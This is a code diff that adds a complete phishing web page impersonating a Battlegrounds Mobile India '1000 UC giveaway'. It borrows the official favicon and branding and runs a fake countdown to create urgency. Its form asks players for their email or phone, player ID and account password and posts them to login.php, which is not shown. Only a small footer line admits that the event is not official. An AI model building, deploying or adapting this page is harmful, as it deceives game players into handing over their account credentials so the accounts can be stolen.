@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BGMI 1000 UC Giveaway | Official Rewards</title>
+    <link rel="shortcut icon" href="https://www.battlegroundsmobileindia.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #FF8C00; /* BGMI Orange */
+            --secondary: #000000;
+            --accent: #FF4500;
+        }
+        
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255,140,0,0.15) 0%, transparent 25%),
+                radial-gradient(circle at 80% 70%, rgba(255,140,0,0.15) 0%, transparent 25%),
+                linear-gradient(to bottom, #000000, #1A1A1A);
+            color: white;
+            margin: 0;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent);
+            padding: 2rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid var(--primary);
+        }
+
+        .bgmi-logo {
+            height: 80px;
+            margin-bottom: 1rem;
+            filter: drop-shadow(0 0 15px rgba(255,140,0,0.7));
+        }
+
+        .reward-card {
+            background: rgba(10,10,10,0.9);
+            border: 1px solid var(--primary);
+            max-width: 500px;
+            margin: 3rem auto;
+            border-radius: 5px;
+            box-shadow: 0 0 40px rgba(255,140,0,0.2);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .card-header {
+            background: linear-gradient(to right, rgba(255,140,0,0.2), rgba(0,0,0,0.5));
+            padding: 1.5rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,140,0,0.3);
+        }
+
+        .form-group {
+            padding: 2rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 1.5rem;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            color: white;
+            font-size: 16px;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255,140,0,0.5);
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, var(--primary), #FF6A00);
+            color: black;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(to right, #FF9E00, var(--primary));
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(255,140,0,0.5);
+        }
+
+        .countdown {
+            background: rgba(0,0,0,0.7);
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+            font-family: monospace;
+            font-size: 1.2rem;
+        }
+
+        .legal {
+            font-size: 0.7rem;
+            color: #666;
+            text-align: center;
+            margin-top: 3rem;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="logo.png" alt="BGMI Logo" class="bgmi-logo">
+        <h1 style="color: var(--primary);">1000 UC ELITE GIVEAWAY</h1>
+        <p>Verify your account to claim your free UC</p>
+    </div>
+    
+    <div class="reward-card">
+        <div class="card-header">
+            <h2 style="color: var(--primary);">LIMITED TIME OFFER</h2>
+            <p>Only for first 5,000 players</p>
+            <div class="countdown">
+                ⏳ <span id="timer">23:59:59</span> REMAINING
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <form action="login.php" method="POST">
+                <label class="form-label" for="contact">Email / Phone</label>
+                <input class="form-input" type="text" name="contact" id="contact" placeholder="For reward delivery" required>
+
+                <label class="form-label" for="uid">BGMI UID</label>
+                <input class="form-input" type="text" name="uid" id="uid" placeholder="Your 10-digit Player ID" required>
+
+                <label class="form-label" for="password">Account Password</label>
+                <input class="form-input" type="password" name="password" id="password" placeholder="Your BGMI Password" required>
+
+                <button type="submit" class="submit-btn">🎖️ CLAIM 1000 UC</button>
+            </form>
+        </div>
+    </div>
+    
+    <p class="legal">
+        This is not an official Krafton event. By verifying your account, you agree to our Terms of Service.<br>
+        Battlegrounds Mobile India is a trademark of Krafton, Inc.
+    </p>
+
+    <script>
+        // Countdown timer
+        function updateTimer() {
+            const now = new Date();
+            const end = new Date();
+            end.setHours(23, 59, 59);
+            
+            const diff = end - now;
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const secs = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('timer').textContent = 
+                `${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+    </script>
+</body>
+</html>
